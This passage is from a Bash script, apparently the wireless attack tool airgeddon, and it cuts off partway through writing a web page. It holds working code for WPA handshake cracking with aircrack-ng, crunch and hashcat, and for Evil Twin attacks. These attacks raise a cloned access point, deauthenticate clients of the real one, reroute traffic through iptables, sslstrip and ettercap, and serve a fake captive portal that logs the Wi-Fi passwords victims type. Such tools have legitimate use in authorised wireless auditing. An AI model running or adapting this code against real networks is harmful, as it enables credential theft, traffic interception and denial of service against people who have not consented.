	manage_hashcat_pot
}

#Check if the password was decrypted using hashcat and manage to save it on a file
function manage_hashcat_pot() {

	local regexp="All hashes have been recovered"
	if [ -n "${hashcat_fix}" ]; then
		local regexp="Status\.{1,9}:[[:space:]]Cracked"
	fi

	if [[ ${hashcat_output} =~ ${regexp} ]]; then

		echo
		language_strings "${language}" 234 "yellow"
		ask_yesno 235
		if [ ${yesno} = "y" ]; then

			hashcat_potpath=$(env | grep ^HOME | awk -F = '{print $2}')
			lastcharhashcat_potpath=${hashcat_potpath: -1}
			if [ "${lastcharhashcat_potpath}" != "/" ]; then
				hashcat_potpath="${hashcat_potpath}/"
			fi
			hashcatpot_filename="hashcat-${bssid}.pot"
			hashcat_potpath="${hashcat_potpath}${hashcatpot_filename}"

			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "hashcatpot"
			done

			cp "${tmpdir}hctmp.pot" "${potenteredpath}"
			echo
			language_strings "${language}" 236 "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if the passwords were captured using ettercap and manage to save them on a file
function manage_ettercap_log() {

	ettercap_log=0
	ask_yesno 302
	if [ ${yesno} = "y" ]; then
		ettercap_log=1
		default_ettercap_logpath=$(env | grep ^HOME | awk -F = '{print $2}')
		lastcharettercaplogpath=${default_ettercap_logpath: -1}
		if [ "${lastcharettercaplogpath}" != "/" ]; then
			ettercap_logpath="${default_ettercap_logpath}/"
		fi
		default_ettercaplogfilename="evil_twin_captured_passwords-${essid}.txt"
		rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
		tmp_ettercaplog="${tmpdir}${ettercap_file}"
		default_ettercap_logpath="${ettercap_logpath}${default_ettercaplogfilename}"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "ettercaplog"
		done
	fi
}

#Check if the passwords were captured using the captive portal Evil Twin attack and manage to save them on a file
function manage_captive_portal_log() {

	default_et_captive_portal_logpath=$(env | grep ^HOME | awk -F = '{print $2}')
	lastcharetcaptiveportallogpath=${default_et_captive_portal_logpath: -1}
	if [ "${lastcharetcaptiveportallogpath}" != "/" ]; then
		et_captive_portal_logpath="${default_et_captive_portal_logpath}/"
	fi
	default_et_captive_portallogfilename="evil_twin_captive_portal_password-${essid}.txt"
	default_et_captive_portal_logpath="${et_captive_portal_logpath}${default_et_captive_portallogfilename}"
	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "et_captive_portallog"
	done
}

#Captive portal language menu
function set_captive_portal_language() {

	clear
	language_strings "${language}" 293 "title"
	print_iface_selected
	print_et_target_vars
	print_iface_internet_selected
	echo
	language_strings "${language}" 318 "green"
	print_simple_separator
	language_strings "${language}" 79
	language_strings "${language}" 80
	language_strings "${language}" 113
	language_strings "${language}" 116
	language_strings "${language}" 249
	language_strings "${language}" 308
	language_strings "${language}" 320
	print_hint ${current_menu}

	read -r captive_portal_language_selected
	echo
	case ${captive_portal_language_selected} in
		1)
			captive_portal_language="ENGLISH"
		;;
		2)
			captive_portal_language="SPANISH"
		;;
		3)
			captive_portal_language="FRENCH"
		;;
		4)
			captive_portal_language="CATALAN"
		;;
		5)
			captive_portal_language="PORTUGUESE"
		;;
		6)
			captive_portal_language="RUSSIAN"
		;;
		7)
			captive_portal_language="GREEK"
		;;
		*)
			invalid_captive_portal_language_selected
		;;
	esac
}

#Read and validate the minlength var
function set_minlength() {

	minlength=0
	while [[ ! ${minlength} =~ ^[8-9]$|^[1-5][0-9]$|^6[0-3]$ ]]; do
		echo
		language_strings "${language}" 194 "green"
		read -r minlength
	done
}

#Read and validate the maxlength var
function set_maxlength() {

	maxlength=0
	while [[ ! ${maxlength} =~ ^[8-9]$|^[1-5][0-9]$|^6[0-3]$ ]]; do
		echo
		language_strings "${language}" 195 "green"
		read -r maxlength
	done
}

#Manage the minlength and maxlength vars on bruteforce attacks
function set_minlength_and_maxlength() {

	set_minlength
	maxlength=0
	while [[ ${maxlength} -lt ${minlength} ]]; do
		set_maxlength
	done
}

#Charset selection menu
function set_charset() {

	clear
	language_strings "${language}" 238 "title"
	language_strings "${language}" 196 "green"
	print_simple_separator
	language_strings "${language}" 197
	language_strings "${language}" 198
	language_strings "${language}" 199
	language_strings "${language}" 200

	case ${1} in
		"aircrack")
			language_strings "${language}" 201
			language_strings "${language}" 202
			language_strings "${language}" 203
			language_strings "${language}" 204
			language_strings "${language}" 205
			language_strings "${language}" 206
			language_strings "${language}" 207
			print_hint ${current_menu}
			read -r charset_option
			case ${charset_option} in
				1)
					charset=${crunch_lowercasecharset}
				;;
				2)
					charset=${crunch_uppercasecharset}
				;;
				3)
					charset=${crunch_numbercharset}
				;;
				4)
					charset=${crunch_symbolcharset}
				;;
				5)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}"
				;;
				6)
					charset="${crunch_lowercasecharset}${crunch_numbercharset}"
				;;
				7)
					charset="${crunch_uppercasecharset}${crunch_numbercharset}"
				;;
				8)
					charset="${crunch_symbolcharset}${crunch_numbercharset}"
				;;
				9)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_numbercharset}"
				;;
				10)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_symbolcharset}"
				;;
				11)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_numbercharset}${crunch_symbolcharset}"
				;;
			esac
		;;
		"hashcat")
			language_strings "${language}" 237
			print_hint ${current_menu}
			read -r charset_option
			case ${charset_option} in
				1)
					charset="?l"
				;;
				2)
					charset="?u"
				;;
				3)
					charset="?d"
				;;
				4)
					charset="?s"
				;;
				5)
					charset="?a"
				;;
			esac

			charset_tmp=${charset}
			for ((i=0; i < maxlength - 1; i++)); do
				charset+=${charset_tmp}
			done
		;;
	esac

	set_show_charset "${1}"
}

#Set a var to show the chosen charset
function set_show_charset() {

	showcharset=""

	case ${1} in
		"aircrack")
			showcharset="${charset}"
		;;
		"hashcat")
			case ${charset_tmp} in
				"?a")
					for item in "${hashcat_charsets[@]}"; do
						showcharset+=$(hashcat --help | grep "${item} =" | awk '{print $3}')
					done
				;;
				*)
					showcharset=$(hashcat --help | grep "${charset_tmp} =" | awk '{print $3}')
				;;
			esac
		;;
	esac
}

#Execute aircrack+crunch bruteforce attack
function exec_aircrack_bruteforce_attack() {

	crunch "${minlength}" "${maxlength}" "${charset}" | aircrack-ng -a 2 -b "${bssid}" -w - "${enteredpath}"
	language_strings "${language}" 115 "read"
}

#Execute aircrack dictionary attack
function exec_aircrack_dictionary_attack() {

	aircrack-ng -a 2 -b "${bssid}" -w "${DICTIONARY}" "${enteredpath}"
	language_strings "${language}" 115 "read"
}

#Execute hashcat dictionary attack
function exec_hashcat_dictionary_attack() {

	convert_cap_to_hashcat_format
	hashcat_cmd="hashcat -m 2500 -a 0 \"${tmpdir}hctmp.hccap\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}hctmp.pot\" ${hashcat_fix} | tee /dev/fd/5"
	exec 5>&1
	hashcat_output=$(eval "${hashcat_cmd}")
	language_strings "${language}" 115 "read"
}

#Execute hashcat bruteforce attack
function exec_hashcat_bruteforce_attack() {

	convert_cap_to_hashcat_format
	hashcat_cmd="hashcat -m 2500 -a 3 \"${tmpdir}hctmp.hccap\" \"${charset}\" --potfile-disable -o \"${tmpdir}hctmp.pot\" ${hashcat_fix} | tee /dev/fd/5"
	exec 5>&1
	hashcat_output=$(eval "${hashcat_cmd}")
	language_strings "${language}" 115 "read"
}

#Execute hashcat rule based attack
function exec_hashcat_rulebased_attack() {

	convert_cap_to_hashcat_format
	hashcat_cmd="hashcat -m 2500 -a 0 \"${tmpdir}hctmp.hccap\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}hctmp.pot\" ${hashcat_fix} | tee /dev/fd/5"
	exec 5>&1
	hashcat_output=$(eval "${hashcat_cmd}")
	language_strings "${language}" 115 "read"
}

#Execute Evil Twin only Access Point attack
function exec_et_onlyap_attack() {

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_control_script
	launch_control_window

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows
	restore_et_interface
	clean_tmpfiles
}

#Execute Evil Twin with sniffing attack
function exec_et_sniffing_attack() {

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_sniffing
	set_control_script
	launch_control_window

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows
	restore_et_interface
	if [ ${ettercap_log} -eq 1 ]; then
		parse_ettercap_log
	fi
	clean_tmpfiles
}

#Execute Evil Twin with sniffing+sslstrip attack
function exec_et_sniffing_sslstrip_attack() {

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_sslstrip
	launch_sniffing
	set_control_script
	launch_control_window

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows
	restore_et_interface
	if [ ${ettercap_log} -eq 1 ]; then
		parse_ettercap_log
	fi
	clean_tmpfiles
}

#Execute captive portal Evil Twin attack
function exec_et_captive_portal_attack() {

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_control_script
	launch_control_window
	if [ ${captive_portal_mode} = "dnsblackhole" ]; then
		launch_dns_blackhole
	fi
	set_webserver_config
	set_captive_portal_page
	launch_webserver
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows
	restore_et_interface
	clean_tmpfiles
}

#Create configuration file for hostapd
function set_hostapd_config() {

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1

	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n100 | grep -v "${bssid:10:1}" | head -c 1)
	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}

	{
	echo -e "interface=${interface}"
	echo -e "driver=nl80211"
	echo -e "ssid=${essid}"
	echo -e "channel=${channel}"
	echo -e "bssid=${et_bssid}"
	} >> "${tmpdir}${hostapd_file}"
}

#Launch hostapd fake Access Point
function launch_fake_ap() {

	killall hostapd > /dev/null 2>&1
	${airmon} check kill > /dev/null 2>&1
	nm_processes_killed=1

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			hostapd_scr_window_position=${g1_topleft_window}
		;;
		"et_sniffing"|"et_captive_portal")
			hostapd_scr_window_position=${g3_topleft_window}
		;;
		"et_sniffing_sslstrip")
			hostapd_scr_window_position=${g4_topleft_window}
		;;
	esac
	xterm -hold -bg black -fg blue -geometry "${hostapd_scr_window_position}" -T "AP" -e "hostapd \"${tmpdir}${hostapd_file}\"" > /dev/null 2>&1 &
	et_processes+=($!)
	sleep 3
}

#Create configuration file for dhcpd
function set_dhcp_config() {

	route | grep ${ip_range} > /dev/null
	if [ "$?" != "0" ]; then
		et_ip_range=${ip_range}
		et_ip_router=${router_ip}
		et_broadcast_ip=${broadcast_ip}
		et_range_start=${range_start}
		et_range_stop=${range_stop}
	else
		et_ip_range=${alt_ip_range}
		et_ip_router=${alt_router_ip}
		et_broadcast_ip=${alt_broadcast_ip}
		et_range_start=${alt_range_start}
		et_range_stop=${alt_range_stop}
	fi

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}clts.txt" > /dev/null 2>&1
	ifconfig "${interface}" up

	{
	echo -e "authoritative;"
	echo -e "default-lease-time 600;"
	echo -e "max-lease-time 7200;"
	echo -e "subnet ${et_ip_range} netmask ${std_c_mask} {"
	echo -e "\toption broadcast-address ${et_broadcast_ip};"
	echo -e "\toption routers ${et_ip_router};"
	echo -e "\toption subnet-mask ${std_c_mask};"
	} >> "${tmpdir}${dhcpd_file}"

	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
		echo -e "\toption domain-name-servers ${internet_dns1}, ${internet_dns2};" >> "${tmpdir}${dhcpd_file}"
	else
		echo -e "\toption domain-name-servers ${et_ip_router};" >> "${tmpdir}${dhcpd_file}"
	fi

	{
	echo -e "\trange ${et_range_start} ${et_range_stop};"
	echo -e "}"
	} >> "${tmpdir}${dhcpd_file}"

	leases_found=0
	for item in "${!possible_dhcp_leases_files[@]}"; do
		if [ -f "${possible_dhcp_leases_files[${item}]}" ]; then
			leases_found=1
			key_leases_found=${item}
			break
		fi
	done

	if [ ${leases_found} -eq 1 ]; then
		echo -e "lease-file-name \"${possible_dhcp_leases_files[${key_leases_found}]}\";" >> "${tmpdir}${dhcpd_file}"
		chmod a+w "${possible_dhcp_leases_files[${key_leases_found}]}" > /dev/null 2>&1
	else
		touch "${possible_dhcp_leases_files[0]}"
		echo -e "lease-file-name \"${possible_dhcp_leases_files[0]}\";" >> "${tmpdir}${dhcpd_file}"
		chmod a+w "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
	fi

	dhcp_path="${tmpdir}${dhcpd_file}"
	if hash apparmor_status 2> /dev/null; then
		apparmor_status | grep dhcpd > /dev/null
		if [ "$?" = "0" ]; then
			if [ -d /etc/dhcpd ]; then
				cp "${tmpdir}${dhcpd_file}" /etc/dhcpd/ 2> /dev/null
				dhcp_path="/etc/dhcpd/${dhcpd_file}"
			elif [ -d /etc/dhcp ]; then
				cp "${tmpdir}${dhcpd_file}" /etc/dhcp/ 2> /dev/null
				dhcp_path="/etc/dhcp/${dhcpd_file}"
			else
				cp "${tmpdir}${dhcpd_file}" /etc/ 2> /dev/null
				dhcp_path="/etc/${dhcpd_file}"
			fi
			dhcpd_path_changed=1
		fi
	fi
}

#Set routing state and firewall rules for Evil Twin attacks
function set_std_internet_routing_rules() {

	routing_toclean=1
	original_routing_state=$(cat /proc/sys/net/ipv4/ip_forward)
	ifconfig "${interface}" ${et_ip_router} netmask ${std_c_mask} > /dev/null 2>&1

	iptables -F
	iptables -t nat -F
	iptables -X
	iptables -t nat -X

	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
		iptables -P FORWARD ACCEPT
		echo "1" > /proc/sys/net/ipv4/ip_forward
	else
		iptables -P FORWARD DROP
		echo "0" > /proc/sys/net/ipv4/ip_forward
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then
		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ${et_ip_router}:80
		iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination ${et_ip_router}:80
		iptables -A INPUT -p tcp --destination-port 80 -j ACCEPT
		iptables -A INPUT -p tcp --destination-port 443 -j ACCEPT
		if [ ${captive_portal_mode} = "dnsblackhole" ]; then
			iptables -A INPUT -p udp --destination-port 53 -j ACCEPT
		fi
	elif [ "${et_mode}" = "et_sniffing_sslstrip" ]; then
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port ${sslstrip_port}
		iptables -A INPUT -p tcp --destination-port ${sslstrip_port} -j ACCEPT
	fi

	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
		iptables -t nat -A POSTROUTING -o "${internet_interface}" -j MASQUERADE
	fi

	iptables -A INPUT -p icmp --icmp-type 8 -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
	iptables -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
	sleep 2
}

#Launch dhcpd server
function launch_dhcp_server() {

	killall dhcpd > /dev/null 2>&1

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			dchcpd_scr_window_position=${g1_bottomleft_window}
		;;
		"et_sniffing"|"et_captive_portal")
			dchcpd_scr_window_position=${g3_middleleft_window}
		;;
		"et_sniffing_sslstrip")
			dchcpd_scr_window_position=${g4_middleleft_window}
		;;
	esac
	xterm -hold -bg black -fg pink -geometry "${dchcpd_scr_window_position}" -T "DHCP" -e "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}/clts.txt" > /dev/null 2>&1 &
	et_processes+=($!)
	sleep 2
}

#Execute DoS for Evil Twin attacks
function exec_et_deauth() {

	prepare_et_monitor

	case ${et_dos_attack} in
		"Mdk3")
			killall mdk3 > /dev/null 2>&1
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
		;;
		"Aireplay")
			killall aireplay-ng > /dev/null 2>&1
			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
		;;
		"Wds Confusion")
			killall mdk3 > /dev/null 2>&1
			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
		;;
	esac

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			deauth_scr_window_position=${g1_bottomright_window}
		;;
		"et_sniffing"|"et_captive_portal")
			deauth_scr_window_position=${g3_bottomleft_window}
		;;
		"et_sniffing_sslstrip")
			deauth_scr_window_position=${g4_bottomleft_window}
		;;
	esac
	xterm -hold -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "${deauth_et_cmd}" > /dev/null 2>&1 &
	et_processes+=($!)
	sleep 1
}

#Create here-doc bash script used for control windows on Evil Twin attacks
function set_control_script() {

	rm -rf "${tmpdir}${control_file}" > /dev/null 2>&1

	exec 7>"${tmpdir}${control_file}"

	cat >&7 <<-EOF
		#!/bin/bash
		et_heredoc_mode=${et_mode}
	EOF

	cat >&7 <<-'EOF'
		if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
	EOF

	cat >&7 <<-EOF
			path_to_processes="${tmpdir}${webdir}${processesfile}"
			attempts_path="${tmpdir}${webdir}${attemptsfile}"
			attempts_text="${blue_color}${et_misc_texts[${language},20]}:${normal_color}"
			last_password_msg="${blue_color}${et_misc_texts[${language},21]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
			function kill_et_windows() {

				readarray -t ET_PROCESSES_TO_KILL < <(cat < "${path_to_processes}" 2> /dev/null)
				for item in "${ET_PROCESSES_TO_KILL[@]}"; do
					kill "${item}" &> /dev/null
				done
			}
	EOF

	cat >&7 <<-EOF
			function finish_evil_twin() {

				echo "" > "${et_captive_portal_logpath}"
	EOF

	cat >&7 <<-'EOF'
				date +%Y-%m-%d >>\
	EOF

	cat >&7 <<-EOF
				"${et_captive_portal_logpath}"
				{
				echo "${et_misc_texts[${language},19]}"
				echo ""
				echo "BSSID: ${bssid}"
				echo "${et_misc_texts[${language},1]}: ${channel}"
				echo "ESSID: ${essid}"
				echo ""
				echo "---------------"
				echo ""
				} >> "${et_captive_portal_logpath}"
				success_pass_path="${tmpdir}${webdir}${currentpassfile}"
				msg_good_pass="${et_misc_texts[${language},11]}:"
				log_path="${et_captive_portal_logpath}"
				log_reminder_msg="${pink_color}${et_misc_texts[${language},24]}: [${normal_color}${et_captive_portal_logpath}${pink_color}]${normal_color}"
				done_msg="${yellow_color}${et_misc_texts[${language},25]}${normal_color}"
				echo -e "\t${blue_color}${et_misc_texts[${language},23]}:${normal_color}"
				echo
	EOF

	cat >&7 <<-'EOF'
				echo "${msg_good_pass} $( (cat < ${success_pass_path}) 2> /dev/null)" >> ${log_path}
				attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
				et_password=$( (cat < ${success_pass_path}) 2> /dev/null)
				echo -e "\t${et_password}"
				echo
				echo -e "\t${log_reminder_msg}"
				echo
				echo -e "\t${done_msg}"
				if [ "${attempts_number}" -gt 0 ]; then
	EOF

	cat >&7 <<-EOF
					{
					echo ""
					echo "---------------"
					echo ""
					echo "${et_misc_texts[${language},22]}:"
					echo ""
					} >> "${et_captive_portal_logpath}"
					readarray -t BADPASSWORDS < <(cat < "${tmpdir}${webdir}${attemptsfile}" 2> /dev/null)
	EOF

	cat >&7 <<-'EOF'
					for badpass in "${BADPASSWORDS[@]}"; do
						echo "${badpass}" >>\
	EOF

	cat >&7 <<-EOF
						"${et_captive_portal_logpath}"
					done
				fi

				sleep 2
				killall hostapd > /dev/null 2>&1
				killall dhcpd > /dev/null 2>&1
				killall aireplay-ng > /dev/null 2>&1
				killall lighttpd > /dev/null 2>&1
				kill_et_windows
				exit 0
			}
		fi
	EOF

	cat >&7 <<-'EOF'
		date_counter=$(date +%s)
		while true; do
	EOF

	case ${et_mode} in
		"et_onlyap")
			local control_msg=${et_misc_texts[${language},4]}
		;;
		"et_sniffing"|"et_sniffing_sslstrip")
			local control_msg=${et_misc_texts[${language},5]}
		;;
		"et_captive_portal")
			local control_msg=${et_misc_texts[${language},6]}
		;;
	esac

	cat >&7 <<-EOF
			echo -e "\t${yellow_color}${et_misc_texts[${language},0]}"
			echo -e "\t${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
			echo
			echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
			hours=$(date -u --date @$(($(date +%s) - date_counter)) +%H)
			mins=$(date -u --date @$(($(date +%s) - date_counter)) +%M)
			secs=$(date -u --date @$(($(date +%s) - date_counter)) +%S)
			echo -e "\t${hours}:${mins}:${secs}"
	EOF

	cat >&7 <<-EOF
			echo -e "\t${pink_color}${control_msg}${normal_color}\n"
	EOF

	cat >&7 <<-'EOF'
			if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
	EOF

	cat >&7 <<-EOF
				if [ -f "${tmpdir}${webdir}${successfile}" ]; then
					clear
					echo -e "\t${yellow_color}${et_misc_texts[${language},0]}"
					echo -e "\t${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
					echo
					echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
					echo -e "\t${hours}:${mins}:${secs}"
					echo
					finish_evil_twin
				else
					attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
					last_password=$(grep "." ${attempts_path} 2> /dev/null | tail -1)
					tput el && echo -ne "\t${attempts_text} ${attempts_number}"
					if [ "${attempts_number}" -gt 0 ]; then
	EOF

	cat >&7 <<-EOF
						open_parenthesis="${yellow_color}(${normal_color}"
						close_parenthesis="${yellow_color})${normal_color}"
	EOF

	cat >&7 <<-'EOF'
						echo -ne " ${open_parenthesis} ${last_password_msg} ${last_password} ${close_parenthesis}"
					fi
				fi
				echo
				echo
			fi
	EOF

	cat >&7 <<-EOF
			echo -e "\t${green_color}${et_misc_texts[${language},3]}${normal_color}"
			readarray -t DHCPCLIENTS < <(cat < "${tmpdir}clts.txt" 2> /dev/null | grep DHCPACK)
			client_ips=()
	EOF

	cat >&7 <<-'EOF'
			if [[ -z "${DHCPCLIENTS[@]}" ]]; then
	EOF

	cat >&7 <<-EOF
				echo -e "\t${et_misc_texts[${language},7]}"
			else
	EOF

	cat >&7 <<-'EOF'
				for client in "${DHCPCLIENTS[@]}"; do
					[[ ${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="${BASH_REMATCH[1]}" && client_mac="${BASH_REMATCH[2]}"
					if [[ " ${client_ips[*]} " != *" ${client_ip} "* ]]; then
						client_hostname=""
						[[ ${client} =~ .*(\(.+\)).* ]] && client_hostname="${BASH_REMATCH[1]}"
						if [[ -z "${client_hostname}" ]]; then
							echo -e "\t${client_ip} ${client_mac}"
						else
							echo -e "\t${client_ip} ${client_mac} ${client_hostname}"
						fi
					fi
					client_ips+=(${client_ip})
				done
			fi
			echo -ne "\033[K\033[u"
			sleep 0.3
		done
	EOF

	exec 7>&-
	sleep 1
}

#Launch dnsspoof dns black hole for captive portal Evil Twin attack
function launch_dns_blackhole() {

	recalculate_windows_sizes
	xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "DNS" -e "${optional_tools_names[12]} -i ${interface}" > /dev/null 2>&1 &
	et_processes+=($!)
}

#Launch control window for Evil Twin attacks
function launch_control_window() {

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			control_scr_window_position=${g1_topright_window}
		;;
		"et_sniffing")
			control_scr_window_position=${g3_topright_window}
		;;
		"et_captive_portal")
			if [ ${captive_portal_mode} = "internet" ]; then
				control_scr_window_position=${g3_topright_window}
			else
				control_scr_window_position=${g4_topright_window}
			fi
		;;
		"et_sniffing_sslstrip")
			control_scr_window_position=${g4_topright_window}
		;;
	esac
	xterm -hold -bg black -fg white -geometry "${control_scr_window_position}" -T "Control" -e "bash \"${tmpdir}${control_file}\"" > /dev/null 2>&1 &
	et_process_control_window=$!
}

#Create configuration file for lighttpd
function set_webserver_config() {

	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1

	{
	echo -e "server.document-root = \"${tmpdir}${webdir}\"\n"
	echo -e "server.modules = ("
	echo -e "\"mod_cgi\""
	echo -e ")\n"
	echo -e "server.port = 80\n"
	echo -e "index-file.names = ( \"${indexfile}\" )\n"
	echo -e "server.error-handler-404 = \"/\"\n"
	echo -e "mimetype.assign = ("
	echo -e "\".css\" => \"text/css\","
	echo -e "\".js\" => \"text/javascript\""
	echo -e ")\n"
	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
	} >> "${tmpdir}${webserver_file}"

	sleep 2
}

#Create captive portal files. Cgi bash scripts, css and js file
function set_captive_portal_page() {

	rm -rf -R "${tmpdir}${webdir}" > /dev/null 2>&1
	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1

	{
	echo -e "body * {"
	echo -e "\tbox-sizing: border-box;"
	echo -e "\tfont-family: Helvetica, Arial, sans-serif;"
	echo -e "}\n"
	echo -e ".button {"
	echo -e "\tcolor: #ffffff;"
	echo -e "\tbackground-color: #1b5e20;"
	echo -e "\tborder-radius: 5px;"
	echo -e "\tcursor: pointer;"
	echo -e "\theight: 30px;"
	echo -e "}\n"
	echo -e ".content {"
	echo -e "\twidth: 100%;"
	echo -e "\tbackground-color: #43a047;"
	echo -e "\tpadding: 20px;"
	echo -e "\tmargin: 15px auto 0;"
	echo -e "\tborder-radius: 15px;"
	echo -e "\tcolor: #ffffff;"
	echo -e "}\n"
	echo -e ".title {"
	echo -e "\ttext-align: center;"
	echo -e "\tmargin-bottom: 15px;"
	echo -e "}\n"
	echo -e "#password {"
	echo -e "\twidth: 100%;"
	echo -e "\tmargin-bottom: 5px;"
	echo -e "\tborder-radius: 5px;"
	echo -e "\theight: 30px;"
	echo -e "}\n"
	echo -e "#password:hover,"
	echo -e "#password:focus {"
	echo -e "\tbox-shadow: 0 0 10px #69f0ae;"
	echo -e "}\n"
	echo -e ".bold {"
	echo -e "\tfont-weight: bold;"
	echo -e "}\n"
	echo -e "#showpass {"
	echo -e "\tvertical-align: top;"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}${cssfile}"

	{
	echo -e "(function() {\n"
	echo -e "\tvar onLoad = function() {"
	echo -e "\t\tvar formElement = document.getElementById(\"loginform\");"
	echo -e "\t\tif (formElement != null) {"
	echo -e "\t\t\tvar password = document.getElementById(\"password\");"
	echo -e "\t\t\tvar showpass = function() {"
	echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type == \"text\" ? \"password\" : \"text\");"
	echo -e "\t\t\t}"
	echo -e "\t\t\tdocument.getElementById(\"showpass\").addEventListener(\"click\", showpass);"
	echo -e "\t\t\tdocument.getElementById(\"showpass\").checked = false;\n"
	echo -e "\t\t\tvar validatepass = function() {"
	echo -e "\t\t\t\tif (password.value.length < 8) {"
	echo -e "\t\t\t\t\talert(\"${et_misc_texts[${captive_portal_language},16]}\");"
	echo -e "\t\t\t\t}"
	echo -e "\t\t\t\telse {"
	echo -e "\t\t\t\t\tformElement.submit();"
	echo -e "\t\t\t\t}"
	echo -e "\t\t\t}"
	echo -e "\t\t\tdocument.getElementById(\"formbutton\").addEventListener(\"click\", validatepass);"
	echo -e "\t\t}"
	echo -e "\t};\n"
	echo -e "\tdocument.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);"
	echo -e "})();\n"
	echo -e "function redirect() {"
	echo -e "\tdocument.location = \"${indexfile}\";"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}${jsfile}"

	{
	echo -e "#!/bin/bash"
	echo -e "echo '<!DOCTYPE html>'"
	echo -e "echo '<html>'"
	echo -e "echo -e '\t<head>'"
	echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'"
	echo -e "echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'"
	echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
	echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
	echo -e "echo -e '\t</head>'"
	echo -e "echo -e '\t<body>'"
	echo -e "echo -e '\t\t<div class=\"content\">'"
